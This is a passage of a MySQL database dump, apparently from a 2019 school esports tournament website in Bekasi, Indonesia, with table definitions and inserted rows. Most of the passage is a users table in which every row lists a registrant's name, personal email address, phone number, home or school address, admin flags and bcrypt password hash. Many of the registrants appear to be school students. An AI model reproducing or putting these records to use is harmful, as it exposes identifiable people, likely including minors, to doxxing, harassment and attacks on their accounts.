  `url_sb` text NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data untuk tabel `stream_bagan`
--

INSERT INTO `stream_bagan` (`id_sb`, `judul_sb`, `url_sb`) VALUES
(1, 'ml_stream', '-'),
(2, 'ml_bagan', 'https://challonge.com/id/TelscupTelesandi/module'),
(3, 'ff_bagan', '-'),
(4, 'ff_stream', 'https://www.youtube.com/embed/aToXy4C-M7g');

-- --------------------------------------------------------

--
-- Struktur dari tabel `users`
--

CREATE TABLE `users` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `nama_sekolah` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `isAdmin` tinyint(1) NOT NULL DEFAULT '0',
  `isSuperAdmin` tinyint(1) NOT NULL DEFAULT '0',
  `isPJ` tinyint(1) NOT NULL DEFAULT '0',
  `email` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `alamat_sekolah` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `contact_person` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `email_verified_at` timestamp NULL DEFAULT NULL,
  `password` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `remember_token` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data untuk tabel `users`
--

INSERT INTO `users` (`id`, `name`, `nama_sekolah`, `isAdmin`, `isSuperAdmin`, `isPJ`, `email`, `alamat_sekolah`, `contact_person`, `email_verified_at`, `password`, `remember_token`, `created_at`, `updated_at`) VALUES
(31, 'Mardoto', 'ADMIN', 0, 0, 0, 'mardotopandawa@gmail.com', 'Tambun', '081282335099', NULL, '$2y$10$QpdK1ja0FTkwrmQmB9if1uzfotFNtuw/h9CpIl/Wecx/RmpItxXHK', NULL, '2019-09-18 09:05:47', '2019-09-18 09:05:47'),
(33, 'Chart', 'ADMIN', 1, 0, 0, 'chartgans@gmail.com', 'Kali Baru', '123923771283', '2019-09-18 13:25:25', '$2y$10$5b9uEoM.SWMP8OOyc8g5weHXF.p6AFK6lh3orRDo4brrQnI6sJqcq', NULL, '2019-09-18 13:24:51', '2019-09-18 13:25:25'),
(34, 'Cantika', 'ADMIN', 1, 0, 0, 'cantikafebriani2402@gmail.com', 'Mangunjaya', '0895393036011', '2019-09-18 13:40:34', '$2y$10$.OToFcpTsjadfjQhfF9pI.uLJRcCCgMed8PgkDoe651hJsl.vU57K', NULL, '2019-09-18 13:30:37', '2019-09-18 13:40:34'),
(42, 'Ihsan rabbani', 'Sma negeri 2 tambun utara', 0, 0, 0, 'rabbaniihsan143@gmail.com', 'Perum Alamanda Regency No.Blok F, Karangsatria, Kec. Tambun Utara, Bekasi, Jawa Barat 17510', '083805160454', '2019-09-19 08:35:29', '$2y$10$skHCuPR3zv9YTlZQIFrsbOCaflHUiqrS/ng5Qr4brS6B8k2ZDAhy6', NULL, '2019-09-19 08:33:39', '2019-09-19 08:35:29'),
(43, 'Muhammad rizqi ramadhani', 'Smp negeri 7 tambun selatan', 0, 0, 0, 'far130598@gmail.com', 'Perum Graha Prima Blok E Mangun Jaya, Mangunjaya, Kec. Tambun Sel., Bekasi, Jawa Barat', '082210867521', '2019-09-19 12:30:45', '$2y$10$AiLQ5rREEtj7XbJzjA2NO.Kzol8GS6TcScnpMDlpGVihMh7aqwR3G', NULL, '2019-09-19 12:30:03', '2019-09-19 12:30:45'),
(44, 'Helga Yunus', 'SMPIT DAARUSSALAM', 0, 0, 0, 'helganax05@gmail.com', 'Jl. Boulevart Raya Blok D-4 No.1, Wanasari, Kec. Cibitung, Bekasi, Jawa Barat 17520', '087820504113', '2019-09-19 13:36:53', '$2y$10$/zszvZvPrwvMJ9oArYWo4uhQIPn506BPWjOxu7xRVToe8CM1QI2Qi', NULL, '2019-09-19 13:32:11', '2019-09-19 13:36:53'),
(45, 'Yeremia Saputra', 'SMK KARYA GUNA BHAKTI 2 KOTA BEKASI', 0, 0, 0, 'yeremiasaputra54@gmail.com', 'Jl. H.Ujan, RT.006/RW.007, Duren Jaya, Kec. Bekasi Timur, Kota Bks, Jawa Barat 17111', '087812270977', '2019-09-19 14:32:58', '$2y$10$7gpait1tyoGmeXLc/SQchOT8fFzEA51OZ5AQnWg1/3cfHTfTF.Uwq', NULL, '2019-09-19 14:32:24', '2019-09-19 14:32:58'),
(46, 'Jody Setiawan', 'Smk Karya Bangsa', 0, 0, 0, 'jodi56102@gmail.com', 'Perum Graha Melasti Blok FB. 17 No. 8', '089653920325', '2019-09-19 15:17:27', '$2y$10$eLEeHUfCZZvfY.5Aw3dDQOYi5ZFgIiAJzZ17k8JAIFhmBk9gJjsBm', NULL, '2019-09-19 15:14:01', '2019-09-19 15:17:27'),
(47, 'William Sitanggang', 'SMA Marsudirini Bekasi', 0, 0, 0, 'williamshansitanggang@gmail.com', 'Jl. Raya Narogong, Jl. Kemang Pratama Raya No.202, RT.002/RW.001, Bojong Rawalumbu, Kec. Rawalumbu, Kota Bks, Jawa Barat 17116', '088808105372', '2019-09-19 17:56:43', '$2y$10$Dp6pJht7zXZY7cQu161CNOa/gnqoEYjT0PR6jDrbsaPqI8GqPdPfm', NULL, '2019-09-19 17:56:26', '2019-09-19 17:56:43'),
(48, 'varrel', 'SMK AL-MUHADJIRIN', 0, 0, 0, 'farrel.bolt@gmail.com', 'jl.pulau jawa raya', '089682566881', '2019-09-20 00:14:07', '$2y$10$sVKUEhyz44ppLRQB9VEuie6PFshJqNzuo8V59rwrFeIgfWoUHbW52', NULL, '2019-09-20 00:10:54', '2019-09-20 00:14:07'),
(49, 'Nanda Sumitro', 'SMAN 2 TAMBUN SELATAN', 0, 0, 0, 'nanda.sumitro@gmail.com', 'JL Aries Desa Mekarsari Kec Tambun Selatan', '082111117674', '2019-09-20 00:30:49', '$2y$10$CQ6FlU4IZrIwM1OijbUVPuHNfo1lRvdeT6gCYBRvp9WuwA0HtHAF6', NULL, '2019-09-20 00:25:26', '2019-09-20 00:30:49'),
(50, 'sultan', 'SMK tridaya', 0, 0, 0, 'lemonsice87@gmail.com', 'Jln KH.Mas\'ud tambun selatan', '08995048896', '2019-10-03 05:17:26', '$2y$10$g/raHLJbHtpJN7HRcWufBeG.m./SMgV.Z9e89LgVMjFXS9Pau6eKu', NULL, '2019-09-20 03:27:27', '2019-10-03 05:17:26'),
(51, 'Asraf', '-', 0, 0, 0, 'mkang338@gmail.com', '-', '082213006727', '2019-09-20 04:47:36', '$2y$10$V8C.pXDlPPRBelBuDzXxK.NuAxgrGuLAapyRG9MiyA1otHjBreJ0i', NULL, '2019-09-20 04:45:38', '2019-09-20 04:47:36'),
(53, 'SMP NEGERI 8 CIBITUNG', 'SMP NEGERI 8 CIBITUNG', 0, 0, 0, 'smpnegeri8cibitung@gmail.com', 'PERUM METLAND CIBITUNG ROW 12 DESA WANAJAYA KECAMATAN CIBITUNG KABUPATEN BEKASI', '085780077724', '2019-09-20 05:12:00', '$2y$10$kkZRa0C9R6UUhc7aGoSlpO8hzK069FjdGZ0FiApcwQaXwkVlXox2y', NULL, '2019-09-20 05:11:37', '2019-09-20 05:12:00'),
(54, 'Dimas Nugroho', 'SMAN 4 Bekasi', 0, 0, 0, 'dimas.nugroho882@gmail.com', 'Jl. Cemara Permai No.Perum, Harapan Jaya, Bekasi Utara', '0895358418473', '2019-09-20 05:43:34', '$2y$10$UJPkQ4ksdbSiIPn6SZeReeMDKVxQxAyaNhdZcNq6/foBUVUq/Ah1y', NULL, '2019-09-20 05:43:11', '2019-09-20 05:43:34'),
(56, 'Hafizh', 'SMK AL MUHADJIRIN', 0, 0, 0, 'hafizhrismansyah@gmail.com', 'Perumnas III, Jl. P. Jawa Raya, RT.001/RW.022, Aren Jaya, Kec. Bekasi Tim., Kota Bks, Jawa Barat 17111', '089516330351', '2019-09-20 10:53:41', '$2y$10$QEsbRjAyv5pk366M8RXzd.RaTWfKXLCQNTKnusC5oU2sD.Hym8HjK', NULL, '2019-09-20 10:53:21', '2019-09-20 10:53:41'),
(58, 'Rafael Hutagaol', 'SMAN 7 TAMBUN SELATAN', 0, 0, 0, 'ebenhutagaol5@gmail.com', 'GRAHA PRIMA BARU', '081314833036', '2019-09-21 05:07:16', '$2y$10$toc0xphWkZCmMmpkJ6JPGuhPOalvynodrXbckOcqbp7HfHywyP2YW', NULL, '2019-09-21 05:06:21', '2019-09-21 05:07:16'),
(59, 'Zalfa', 'Sman 4', 0, 0, 0, 'herrzallfa@gmail.com', 'Jl. Cemara Permai No.Perum, Harapan Jaya, Kec. Bekasi Utara, Kota Bks, Jawa Barat 17124', '081310095553', '2019-09-21 11:35:58', '$2y$10$3ImdBOM6WUfjVKfOIcLhPOcyn4PIPhQdRSFwk6COW6XK0l.5wjxf2', NULL, '2019-09-21 11:33:11', '2019-09-21 11:35:58'),
(60, 'M Rifky Abdullah', 'SMPN 2 Cikarang Barat', 0, 0, 0, 'rifky55600@gmail.com', 'Jl. Bojong Koneng No 125. Telaga Murni l. Kec. Cikarang Barat', '081296101694', '2019-09-22 02:36:06', '$2y$10$q5z5fHoxRAQ4AvuGAfy3De7SSythExNFFuYbWqvDhzncydlkqaDsC', NULL, '2019-09-22 02:35:45', '2019-09-22 02:36:06'),
(61, 'Rio Mahabelly betrand', 'ADMIN', 1, 0, 0, 'riiobtrn24@gmail.com', 'Lopp cianjur', '081384772012', '2019-09-23 07:12:49', '$2y$10$TtrtkR73Yn6O0nWshK1gF..blFRQDaX5D9qT0Ue2GRy4EImMeMApW', NULL, '2019-09-23 07:12:22', '2019-09-23 07:12:49'),
(63, 'Entol Rizky', 'ADMIN', 0, 0, 0, 'mrl0c4d@gmail.com', '-', '081323086509', NULL, '$2y$10$RLF8FdsX77HWftJU19311.57IaZsUiXMMZQVwIB4S.Blmg6hm3N46', NULL, '2019-09-23 10:47:40', '2019-09-23 10:47:40'),
(64, 'Zarip', 'ADMIN', 1, 0, 0, 'zarifafzal23@gmail.com', '-', '087874385891', '2019-09-23 10:51:07', '$2y$10$ftw5RwZvsQC7awnqj0clmOF83FFtvA98l/DxsjagPe1VJnlep/mb6', NULL, '2019-09-23 10:48:00', '2019-09-23 10:51:07'),
(65, 'Dendi Ramadhan', 'ADMIN', 1, 0, 0, 'dendiramadhan154@gmail.com', '-', '082249705543', '2019-09-22 18:00:00', '$2y$10$W7gg3kpytnT/hmnIq05OSOrsdw28IucucnA8r9cILoOvNpwNuV5OS', NULL, '2019-09-23 11:00:31', '2019-09-23 11:00:31'),
(66, 'Fahmi prayoga', 'ADMIN', 1, 0, 0, 'fahmiprayoga26@gmail.com', '-', '089632031230', '2019-08-31 18:00:00', '$2y$10$cNKwz/AYLxkCw6lcml210uqpj6O0ZfROUb/fAL5z2vquz9Gqb0E..', NULL, '2019-09-23 11:23:41', '2019-09-23 11:23:41'),
(67, 'Zahra Z', 'ADMIN', 1, 0, 0, 'lightblue2709@gmail.com', 'Jl. KH Mochammad, Mekarsari Raya, Tambun Selatan', '082117067306', '2019-09-23 13:52:46', '$2y$10$DWcAXnXMc8BleOe98rR7zOQoxcrY7SckR0WZ1ocsBLkVZae63ywta', NULL, '2019-09-23 13:09:07', '2019-09-23 13:52:46'),
(68, 'Tanti', 'ADMIN', 1, 0, 0, 'tantiprima122@gmail.com', '-', '082114182621', '2019-09-23 13:33:31', '$2y$10$EEJFq1069tWSDyADARQlt.PpghBU0fOM0nYuqMB2GJP..6vU8Ikz.', NULL, '2019-09-23 13:33:09', '2019-09-23 13:33:31'),
(69, 'sasya amanda', 'ADMIN', 1, 0, 0, 'sasyaamanda03@gmail.com', '-', '0895357367852', '2019-08-31 18:00:00', '$2y$10$YXQaWwZPPeDrlERzhrckt.64hNOG3iex4NkmWDozf1hImnjblQfzS', NULL, '2019-09-23 15:10:28', '2019-09-23 15:10:28'),
(70, 'Dwi', 'ADMIN', 1, 0, 0, 'dwiselviani63@gmail.com', '-', '089647124357', '2019-09-23 15:49:26', '$2y$10$dtzNR6qKXKs1DgHmNrR8set.auR7liz/cPdskEvDNw4KyYxHifbGG', NULL, '2019-09-23 15:43:42', '2019-09-23 15:49:26'),
(72, 'Suyuful Asfia', 'ADMIN', 1, 0, 0, 'titadesta31@gmail.com', 'Mangun Jaya', '085884319546', '2019-09-24 10:55:52', '$2y$10$NO7uNa.y0YnVjZ15qPR74O35Olouqij6nNLp6pL56yCzIRnMh4ZRO', NULL, '2019-09-24 10:55:31', '2019-09-24 10:55:52'),
(73, 'sasya', 'ADMIN', 1, 0, 0, 'julianto13092@gmail.com', '-', '0895357367852', '2019-09-30 18:00:00', '$2y$10$zaHPZip8q1aSzcqwuXV1Vuf9jbUybrmpnTK0yfAYsiQbuDxe4e.EW', NULL, '2019-09-24 11:55:08', '2019-09-24 11:55:08'),
(75, 'Reza zanarsyah', 'SMAN 9 Tamsel', 0, 0, 0, 'khadaffilam@gmail.com', 'Pdgs Metland tambun', '6281248187173', '2019-09-25 03:20:32', '$2y$10$NBIRyKjyLJqMAAEQSNlhQu99RZm7OS37AJ2liNv5sykq97ES.sUgS', NULL, '2019-09-25 03:19:39', '2019-09-25 03:20:32'),
(76, 'Deni Setiawan', 'SMAN 1 Cibarusah', 0, 0, 0, 'ds292527@gmail.com', 'Jl. Raya Cibarusah\r\nDes. sindangmulya\r\nkec. Cibarusah\r\nKab. Bekasi', '0881024075205', '2019-09-26 02:40:50', '$2y$10$czjxRSqL.hP.U0J8hn6BTu4J0MhZ2Ry79tGGHFC0g.4Kx1J7./0gG', NULL, '2019-09-26 02:40:17', '2019-09-26 02:40:50'),
(77, 'SMP Al Muhadjirin Bekasi', 'SMP Al Muhadjirin Bekasi', 0, 0, 0, 'smpalmuhadjirinbekasi@gmail.com', 'Jl. P. Jawa Raya - Sasak Jarang Perumnas 3 Kel. Aren Jaya Kec. Bekasi Timur Kota Bekasi Provinsi Jawa Barat 17111', '02188350745', '2019-09-27 02:04:31', '$2y$10$BETFVDYCzY/ygvrDwwXXfu2Wtqv0nFVI2LZPamXvYOIeeehRKkp/C', NULL, '2019-09-27 02:01:13', '2019-09-27 02:04:31'),
(78, 'Aldrin pahlevi', 'Pasundan', 0, 0, 0, 'aldrinpahlevi@gmail.com', 'Jl. Pulau jawa', '089637499447', '2019-09-27 14:09:08', '$2y$10$N32GWeyXrcB8pwU5UbDvTOjv2egUkcWorx.usNm2Kkzkd./aTSzGq', NULL, '2019-09-27 14:08:15', '2019-09-27 14:09:08'),
(80, 'Septian Bagus Alen Rasyadan', 'SMPN 2 cibitung', 0, 0, 0, 'SeptianAlen@gmail.com', 'Jalan kampung utan', '085777633902', NULL, '$2y$10$pxH.i1RbI.c5j3CMj8YpQuuPfVBO2YqGKsIiV5N.ZRhqCsHo5UA7q', NULL, '2019-09-28 03:16:15', '2019-09-28 03:16:15'),
(81, 'Aulrahman', 'AL Muslim esports', 0, 0, 0, 'aulreh25@gmail.com', 'Jl. Kp. Utan No.36, Tambun, Kec. Tambun Sel., Bekasi, Jawa Barat 17510', '087873740749', '2019-09-30 13:05:22', '$2y$10$.64S1jtuy9ObzV9obQF6NO28PmBHxyEHyXOGQZEno1vJ7OxoNDXAi', NULL, '2019-09-30 13:03:57', '2019-09-30 13:05:22'),
(82, 'Luthfi rizal', 'Smpn 3 tambun selatan', 0, 0, 0, 'luthfirizal05@gmail.com', 'Jl. Villa Bekasi Indah 1, Mangunjaya, Kec. Tambun Sel., Bekasi, Jawa Barat 17510, Indonesia', '081932846093', '2019-10-01 15:52:23', '$2y$10$uZyjyE8t3jyV4qyvi7w6JeurXf8sgJPpAnQyoLR9C8dkuou3D1ZgW', NULL, '2019-10-01 15:51:52', '2019-10-01 15:52:23'),
(83, 'Dhafin bintang', 'Putradarma', 0, 0, 0, 'naufalfauzi222@gmail.com', 'Putradarma Islamic School, Jl. Rw. Pisang No.19, Sumberjaya, Kec. Tambun Sel., Bekasi, Jawa Barat 17510', '081218606478', NULL, '$2y$10$dDgTtudedaoIWu/xENWYFuwN4efcpMP4XbRXo.8.gsIejiIKb8IkO', NULL, '2019-10-01 16:19:05', '2019-10-01 16:19:05'),
(84, 'Dhafin bintang', 'Putradarma islam school', 0, 0, 0, 'naufalfauzi214@gmail.com', 'Putradarma Islamic School, Jl. Rw. Pisang No.19, Sumberjaya, Kec. Tambun Sel., Bekasi, Jawa Barat 17510', '08128606478', '2019-10-01 16:24:03', '$2y$10$GDiI.NvC09iMRG2gOLXA8eSoWFqIOE3uwa6JAYsPbQBTXG/gfkzPG', NULL, '2019-10-01 16:22:54', '2019-10-01 16:24:03'),
(85, 'Robi Mulyana', 'SMK 10 November Bekasi / ｢Dark｣ωoιf', 0, 0, 0, 'robisaja123@gmail.com', 'Jl.Raya Balai desa RT.02 RW 02, prum Villa Mutiara jaya(Deket stadion Belakang Desa wanajaya) Des.wanajaya KEC cibitung', '087771934882', NULL, '$2y$10$M2u3aSGLUlLtf1N.e3rea.1288QEXmkFCtF/OUaSmktN2YucHfZrO', NULL, '2019-10-02 03:36:43', '2019-10-02 03:36:43'),
(86, 'Annisa Aulia', 'MULTIMEDIA SMK YADIKA 13', 0, 0, 0, 'annisaaulia1090@gmail.com', 'Jl. Raya Villa Bekasi Indah, Jejalenjaya, Kec. Tambun Utara, Bekasi, Jawa Barat 17510', '085693649260', '2019-10-02 16:20:12', '$2y$10$.V/VnCcAo9cpo./9XOKj.eQgbTFVjxWbVFNX3ziCwMVa8DmGZzIqG', NULL, '2019-10-02 16:15:39', '2019-10-02 16:20:12'),
(87, 'Angelita', 'Al- munir', 0, 0, 0, 'angelitaamaniah46436@gmail.com', 'Villa Bekasi indah 1', '081263551885', '2019-10-06 02:46:07', '$2y$10$KpYULDJD98fLS.XceN5ByeIJ9FNDosJjkRNAGr1zQ4gsNI5Th1iTS', NULL, '2019-10-06 02:44:39', '2019-10-06 02:46:07'),
(88, 'Rizki Fadillah', 'SMK AL-MUNIR TAMBUN', 0, 0, 0, 'rizkifa096@gmail.com', 'Jl.villa Bekasi indah', '085695077434', '2019-10-06 07:56:47', '$2y$10$7E3ioG6XD4stUMABLR/OceXllbLRsIoWop4rEXnjkc5BO/u3VZjMu', NULL, '2019-10-06 07:52:26', '2019-10-06 07:56:47'),
(89, 'A’syafiq nugroho', 'SMPN 3 TAMSEL', 0, 0, 0, 'asyafiqn15@gmail.com', 'Jalan beo no.3 perumahan bumi lestari,Tambun selatan', '0895367066763', '2019-10-08 10:13:05', '$2y$10$BbwtG.w7od1KtfkmZ1ER5.9RvhG0LzUB0.k8S0FeKs4f67Ghap8AS', NULL, '2019-10-08 10:11:36', '2019-10-08 10:13:05'),
(90, 'Mohammad Entol Rizky', 'ADMIN', 1, 0, 0, 'kadmaker27@gmail.com', '-', '08', '2019-10-10 02:15:26', '$2y$10$nlF35IsrL5de93H6Osv2le3knINRIWpoxisqxcgbXLhfqhO/4QpDO', NULL, '2019-10-10 02:14:33', '2019-10-10 02:15:26'),
(91, 'Entol', 'Simulasi', 0, 0, 0, 'simulasi@telscup.com', '-', '8132309786', '2019-10-11 18:00:00', '$2y$10$yho5VAWNb.PasjtqChEOmurb6zf526xioWhTzocUOh2IjyObdJqAi', NULL, '2019-10-12 09:18:08', '2019-10-12 09:18:08'),
(92, 'vrl', 'Franhinhr', 0, 0, 0, 'farrel.bolt4@gmail.com', 'jl.pulau jawa raya', '089682566881', '2019-10-12 16:25:53', '$2y$10$tnM7M/sQrXxkQyqZH/qKxevFS4Vt7o/eVMgYcUo4AzGMmr/9INBwu', NULL, '2019-10-12 16:25:16', '2019-10-12 16:25:53'),
(93, 'Kyuraz', 'Franhinr', 0, 0, 0, 'pakold69@gmail.com', 'Jl.pulau jawa raya', '089682566881', '2019-10-14 15:50:40', '$2y$10$djZiLRqdw6ylDhR2wSWAf.JutuXklo9JHdzhLzyIiCkB6xLDYCNXK', NULL, '2019-10-14 15:43:13', '2019-10-14 15:50:40'),
(94, 'Nabiel Faturrahman', 'SMP 12 tamsel', 0, 0, 0, 'nabielftrhm@gmail.com', 'Jln p.buton Tambun selatan', '0895377906231', NULL, '$2y$10$yRnYQhy64opk5xjoA1pWWOt8imrvqdoXxSs.31RQaEwr/Qk0YJD8W', NULL, '2019-10-16 16:45:35', '2019-10-16 16:45:35'),
(95, 'varrel', 'franhinr', 0, 0, 0, 'therampage45@gmail.com', 'jl.pulau jawa raya 5', '089682566881', '2019-10-19 02:45:15', '$2y$10$nnWYH6s8GkF5rP2zgGHzvuqvcsP6v565pcdfhJ28czvuoqHuNgQrq', NULL, '2019-10-19 02:44:37', '2019-10-19 02:45:15'),
(97, 'Rizkialfaiz', '(Tambun islamic Scholl(', 0, 0, 0, 'cibitung032@gmail.com', 'Jl.madrasah,Mangun jaya,kec, tambun sel,Bekasi,Jawa barat 17510', '082227999601', NULL, '$2y$10$.GfIOxh1dZo/HGDUJn.6EOP9.Ps7tzYGgnhoDwCjlGU92vxr5Sxve', NULL, '2019-10-20 10:14:16', '2019-10-20 10:14:16'),
(98, 'Rizkialfaiz', '(Tambun islamic Scholl(', 0, 0, 0, 'cibitung032@gmail.com', 'Jl.madrasah,Mangun jaya,kec, tambun sel,Bekasi,Jawa barat 17510', '082227999601', NULL, '$2y$10$z0v.YDjEym3vp5uQdtbdj.nGSU.QzaTLxrLwYOvIJvGdzq6ogrDLK', NULL, '2019-10-20 10:14:16', '2019-10-20 10:14:16'),
(99, 'Sanam', 'Smp islam dewan dakwah', 0, 0, 0, 'sanamudin.bogor93@gmail.com', 'Jl kp. Bulu komplek pusdiklat dewan dakwah', '6281384651879', '2019-10-21 08:59:48', '$2y$10$hXbzmTyRFgLMq1.JkHXOEOZkB0bBcvjaCHpCf36WkFuYshN5gyLga', NULL, '2019-10-21 08:59:17', '2019-10-21 08:59:48'),
(100, 'Rohadani', 'BODREX', 0, 0, 0, 'warbonganarki@gmail.com', 'Jl.  Tuku umar no. 2 Cikarang Barat', '089507060647', NULL, '$2y$10$fyOtFc0/VBvqkczyuj8dfuzwZfm6bFuQ8t0c1l20C2ZzUtoCw11Ie', NULL, '2019-10-22 02:20:34', '2019-10-22 02:20:34'),
(101, 'Claudio Cen', 'admin short movie', 0, 0, 0, 'claudn123@gmail.com', 'Jl. Edelweis no:128, Tambun, Bekasi', '081317252469', '2019-10-22 09:44:19', '$2y$10$g2xY2nFSGUSjswirpWjzBeQOkDPa3AomjBOD6GoeiH8LlLv7sJE62', NULL, '2019-10-22 09:43:43', '2019-10-22 09:44:19'),
(104, 'Iqbal Nur widyananta', 'Cibitung•ID', 0, 0, 0, 'widyanantaiqbal17@gmail.com', 'Cibitung', '089688015941', '2019-10-23 11:24:39', '$2y$10$MrCGQNYIqdCtpUcG5PsrR.Qw0xWmqQkxh34tKOaH1yhNuQFedJTvS', NULL, '2019-10-23 11:24:16', '2019-10-23 11:24:39'),
(105, 'Muhammad Febrian', 'GalleryOfDead', 0, 0, 0, 'febrianannn@gmail.com', '-', '089637551503', '2019-10-23 13:53:35', '$2y$10$Qewv5Xx7PK8g/ACdIIWHWeSlGMle06rfnjGCunDZEW4yZGwIVrkUm', NULL, '2019-10-23 13:51:50', '2019-10-23 13:53:35'),
(106, 'Gilang Ardiansyah', 'Dark Knight Zero', 0, 0, 0, 'gilangardii1w@gmail.com', 'Jl Cirebon Komp. Perumahan duren jaya , Bekasi (SMK Karya Guna 1 Bekasi)', '085751542709', '2019-10-24 11:57:18', '$2y$10$xRhIpueMmBLSr518zu.yV.PR7FoPIjniRXQTpJIbFmKpp9c0Gllua', NULL, '2019-10-24 11:52:34', '2019-10-24 11:57:18'),
(107, 'rambu', 'xcomander', 0, 0, 0, 'rayarr72@gmail.com', 'Jalan harapan jaya, bekasi', '08988994034', '2019-10-25 16:19:56', '$2y$10$q4qgUz6s5kjv8FwCljuFf.jg6VHS2mklj7liNlmhss8CyIkUj36Fi', NULL, '2019-10-25 16:12:27', '2019-10-25 16:19:56'),
(108, 'Aditiya', 'SMAN 1 Sukatani', 0, 0, 0, 'aditpopo29@gmail.com', 'Kp.Gandu Desa.Sukamulya Kec.sukatani Kab.Bekasi', '081410584465', NULL, '$2y$10$Pw6F5rT8JzIwiUzLwEXlBOv/MuptCQn2YI0Mg0oB88puYHOqiNFHO', NULL, '2019-10-26 06:49:57', '2019-10-26 06:49:57'),
(109, 'ABDUL', 'SMPN 04 CIBTUNG', 0, 0, 0, 'empatcibitung@telesandifestival.com', 'PERUM PESONA GADING 1', '081289262235', '2019-10-25 16:19:56', '$2y$10$3qwbUwEat.3.4Ai/8C843OO0IoxVbS7s6wPZsTGYff.vstXEpkFke', NULL, '2019-10-26 13:32:08', '2019-10-26 13:32:08'),
(110, 'HERU', 'SMPN 8 CIBITUNG', 0, 0, 0, '8cibitung@telesandifestival.com', 'PERUM METLAND CIBITUNG', '08570077724', '2019-10-25 16:19:56', '$2y$10$qRdJUO3T29.UqZfjQL5k2OYInycHW1bfYpTSOceSpf.OyMj.2XMuK', NULL, '2019-10-26 13:36:09', '2019-10-26 13:36:09'),
(111, 'MARDI', 'Mts PINK 03 A', 0, 0, 0, 'pink03a@telesandifestival.com', 'KP. RUKOM MANGUN JAYA', '0', '2019-10-25 16:19:56', '$2y$10$QVA18.wFSqiB0Q8wXbFj4O6OHwiDpt4lZedXTJJAymcjiHRit6nMS', NULL, '2019-10-26 13:40:44', '2019-10-26 13:40:44'),
(112, 'M. INSAN', 'SMAIT NURUL FAJRI', 0, 0, 0, 'nurul@telesandifestival.com', 'JL. TELAGA ASIH', '085691115723', '2019-10-25 18:00:00', '$2y$10$M9h92kBZOockDE4pYDO.7ettGqAn9cLfoE3rec/HgMB2WVNClWfGS', NULL, '2019-10-26 13:43:38', '2019-10-26 13:43:38'),
(113, 'RASYA', 'MA NUR EL GHAZY', 0, 0, 0, 'elghazy@telesandifestival.com', 'JL. SAMPANG TIGA SETU', '089606211315', '2019-10-25 18:00:00', '$2y$10$bV.hHRctKvJceRVuaXlms.uoe4gD3p303F.uxsuyxxanpLnRHBdFe', NULL, '2019-10-26 13:46:57', '2019-10-26 13:46:57'),
(114, 'CHAIRUL LAKA', 'SMAIT MUTIARA HIKMAH', 0, 0, 0, 'mutiarahikmah@telesandifestival.com', 'PERUM GRIA ASRI 2', '0895359534007', '2019-10-25 18:00:00', '$2y$10$kBZFJ9UAGKGKTfRZjpGyB.QdddVgG4hvK444i.S8Wt/M79xnckffy', NULL, '2019-10-26 13:49:34', '2019-10-26 13:49:34'),
(115, 'ӍԾɁĦÃΜΜȺǷ ȞǼƝƪ₣', 'ADMIN', 1, 0, 0, 'me@hanifz.com', 'Tambs', '081380004696', '2019-10-26 18:00:00', '$2y$10$u3RxWroCpdmxxW0riQjWPuUzx.uNfQLnRx80egErUSlbLDBlpiRJ2', NULL, '2019-10-27 01:10:05', '2019-10-27 01:10:05'),
(116, 'Ali', 'SMKN 6 KOTA BEKASI', 0, 0, 0, 'aliimarbell@gmail.com', 'Bekasi', '089652446130', '2019-10-27 03:35:02', '$2y$10$ZytNVJcuYMihSCGT8PJVruv.jOk18gnTO1ZH7cDZJQ5FEPzCztvBe', NULL, '2019-10-27 03:26:42', '2019-10-27 03:35:02'),
(117, 'Desianur', 'SMP PGRI 1 BEKASI', 0, 0, 0, 'desianur@gmail.com', 'jl. linggarjati 1 blok D Perum Duren Jaya Bekasi', '0218803892', '2019-10-29 04:52:28', '$2y$10$F93CaNcVLPcXBhYjHxz.quz5qqi4g5lxkqMnVU5rfYWo8TReixIDS', NULL, '2019-10-29 04:48:30', '2019-10-29 04:52:28'),
(118, 'Ignatius Samuel', 'Sma 6 Tambun Selatan (Lontong Sayur)', 0, 0, 0, 'hanzray51@gmail.com', 'SMAN 6 Tambun Selatan, Jl. Raya Jatimulya, RT.01/RW.13, Jatimulya, Kec. Tambun Sel., Bekasi, Jawa Barat 17510', '081287379593', '2019-10-29 11:16:35', '$2y$10$A6ci23IkpgpcRFHLUWadeO51Uwp7RHAXIXUJghpabo97oSWP2XvWa', NULL, '2019-10-29 11:15:53', '2019-10-29 11:16:35'),
(121, 'Ziandra Zavier Giansyah', 'NY', 0, 0, 0, 'ny@telscup.com', '-', '085', '2019-10-28 18:00:00', '$2y$10$Ed713832rPwXhYIK3FaJ3uCSEprMnPuvFqNNfNd1bJMT7KYCBTZzO', NULL, '2019-10-29 11:26:38', '2019-10-29 11:26:38'),
(122, 'Fedri', 'U4', 0, 0, 0, 'u4@telscup.com', '-', '0', '2019-10-28 18:00:00', '$2y$10$QOeOfCqHG4SwH5N9xKByU.ErBh3rMAueOgL7/HdMGgc6U9JfDmKJC', NULL, '2019-10-29 11:28:00', '2019-10-29 11:28:00'),
(123, 'Rafa Abhista A', 'GZ', 0, 0, 0, 'gz@telscup.com', '-', '0', '2019-10-28 18:00:00', '$2y$10$Dv91GJRSK2FNhP/YXWDZhunLcYTimDLSfVU0wOMpEuXlbf6IkTA8W', NULL, '2019-10-29 11:28:02', '2019-10-29 11:28:02'),
(124, 'Gilang  Ardiansyah', 'Z2•DK', 0, 0, 0, 'z2•dk@telscup.com', '-', '0', '2019-10-28 18:00:00', '$2y$10$z7X8URsR0mDJCZe4apX68./IzlsicsqdqD9vDhCSf9Sh06a6RkxVe', NULL, '2019-10-29 11:28:09', '2019-10-29 11:28:09'),
